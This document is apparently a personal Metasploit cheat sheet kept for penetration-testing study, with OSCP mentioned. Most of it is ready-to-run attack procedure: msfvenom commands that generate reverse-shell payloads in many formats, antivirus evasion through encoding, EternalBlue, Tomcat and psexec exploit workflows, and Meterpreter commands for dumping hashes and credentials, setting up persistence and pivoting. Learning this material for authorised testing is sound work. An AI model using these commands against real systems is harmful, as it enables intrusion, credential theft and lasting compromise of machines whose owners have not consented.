# 🛠️ Metasploit Framework (MSF)

> **Category:** Exploitation & Post-Exploitation Framework
> **When to Use:** Exploiting known CVEs, generating payloads, post-exploitation tasks.

---

## 📋 Module Types

| Module | Purpose | Example |
|--------|---------|---------|
| **Exploits** | Leverage a vulnerability to run code | `exploit/windows/smb/ms17_010_eternalblue` |
| **Auxiliary** | Scanning, fuzzing, sniffing | `auxiliary/scanner/smb/smb_version` |
| **Payloads** | Code that executes on target | `windows/x64/meterpreter/reverse_tcp` |
| **Post** | Post-exploitation modules | `post/windows/gather/hashdump` |
| **Encoders** | Obfuscate payloads | `x86/shikata_ga_nai` |
| **Evasion** | AV bypass modules | `evasion/windows/windows_defender_exe` |

---

## ⚙️ Core Commands (msfconsole)

### Navigation
```bash
msfconsole                    # Start Metasploit
search <term>                 # Search for modules
use <module>                  # Select a module
info                          # Show module details
show options                  # Show required settings
show payloads                 # List compatible payloads
show targets                  # List target types
back                          # Exit current module
```

### Configuration
```bash
set RHOSTS <target_ip>        # Set target
set LHOST <your_ip>           # Set your IP (for reverse shells)
set LPORT 4444                # Set listener port
set PAYLOAD <payload>         # Set payload
setg LHOST tun0               # Set globally (persists across modules)
unset RHOSTS                  # Clear a variable
```

### Execution
```bash
check                         # Test if target is vulnerable (non-destructive)
exploit / run                 # Launch the exploit
exploit -j                    # Run as background job
sessions                      # List active sessions
sessions -u 1                 #Tries to upgrade the session to a meterpreter one
sessions -i <id>              # Interact with session
```

---

## 📡 Payload Architecture

### Singles (Inline) — `_` in name
Self-contained, sent in one piece.
```
windows/shell_reverse_tcp        ← underscore = single
linux/x64/shell_reverse_tcp
```
**Pros:** More stable, no second connection needed.

### Staged — `/` in name
Split into stager + stage (downloaded after connection).
```
windows/shell/reverse_tcp        ← slash = staged
windows/meterpreter/reverse_tcp
```
**Pros:** Smaller initial payload, fits in tight buffer spaces.

### Common Payloads
```bash
# Windows
windows/x64/meterpreter/reverse_tcp    # Best for Windows (staged)
windows/x64/shell_reverse_tcp          # Simple shell (single)

# Linux
linux/x64/meterpreter/reverse_tcp      # Meterpreter for Linux
linux/x64/shell_reverse_tcp            # Simple shell

# Web
php/meterpreter/reverse_tcp            # PHP web shells
java/meterpreter/reverse_tcp           # Java applications
```

---

## 🐍 Meterpreter Commands

### Core
```bash
sysinfo                       # System information
getuid                        # Current user
getpid                        # Current process ID
ps                            # List processes
migrate <PID>                 # Move to another process
background                    # Background session (Ctrl+Z)
shell                         # Drop to system shell
exit                          # Close session
```

### File System
```bash
pwd / cd / ls                 # Navigate
download <file>               # Download from target
upload <file>                 # Upload to target
cat <file>                    # Read file
edit <file>                   # Edit file
search -f *.txt               # Search for files
```

### Networking
```bash
ipconfig / ifconfig           # Network interfaces
route                         # Routing table
portfwd add -l 8080 -p 80 -r <internal_ip>  # Port forwarding
arp                           # ARP table
netstat                       # Active connections
```

### Privilege Escalation
```bash
getsystem                     # Attempt auto privesc (Windows)
hashdump                      # Dump SAM hashes
load kiwi                     # Load Mimikatz
creds_all                     # Dump all credentials (kiwi)
```

### Persistence
```bash
run persistence -U -i 10 -p 4444 -r <your_ip>  # Auto-start payload
run post/windows/manage/enable_rdp              # Enable RDP
```

### Pivoting
```bash
run autoroute -s <subnet>/24  # Add route through session
run post/multi/manage/autoroute  # Auto-add routes
use auxiliary/server/socks_proxy # Start SOCKS proxy
```

---

## 🐍 msfvenom: Payload Generation

### Basic Syntax
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

### Common Payloads by Format

```bash
# === WINDOWS ===

# EXE (standard)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe

# DLL (for DLL hijacking)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f dll -o evil.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f psh -o shell.ps1

# MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o evil.msi

# ASP (IIS web shell)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f aspx -o shell.aspx

# === LINUX ===

# ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf

# === WEB ===

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o shell.war

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.py

# === SHELLCODE (for BOF) ===

# Raw shellcode (no bad chars)
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f c -b "\x00\x0a\x0d"

# Python format
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f python -b "\x00"
```

### Encoding (Basic AV Evasion)
```bash
# Encode with shikata_ga_nai (5 iterations)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List available encoders
msfvenom --list encoders
```

---

## 🎯 Common Exploit Workflows

### EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <your_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### Tomcat Manager Upload
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target>
set HttpUsername admin
set HttpPassword admin
exploit
```

### psexec (with credentials)
```bash
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser administrator
set SMBPass <password_or_hash>
exploit
```

---

## 📡 Multi/Handler (Catch Shells)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j    # Run in background
```

---

## 💡 Expert Tips

| Tip | Details |
|-----|---------|
| Always `check` first | Non-destructive vulnerability verification |
| Use `exploit -j` | Runs in background, doesn't block console |
| `set AutoRunScript` | Auto-migrate on shell: `set AutoRunScript post/windows/manage/migrate` |
| Global variables | `setg LHOST tun0` persists across all modules |
| Database | `db_nmap` imports scan results directly |
| Workspace | `workspace -a <name>` to organize engagements |

---

## ⚠️ Common Mistakes

| Mistake | Fix |
|---------|-----|
| Payload doesn't connect back | Check LHOST is correct (use `ip a` to verify) |
| Exploit fails | Try different target/payload, check architecture (x86 vs x64) |
| Session dies immediately | Migrate to stable process ASAP |
| AV catches payload | Use encoding, custom templates, or manual payloads |

---

## Gap list

- msfvenom to understand better

## 🔗 Links

- Before Metasploit → Nmap to identify services and versions
- After initial shell → Meterpreter post modules for privesc
- Alternative: Manual exploitation (more stealthy, better for OSCP)
- Combine with: searchsploit for finding exploits offline
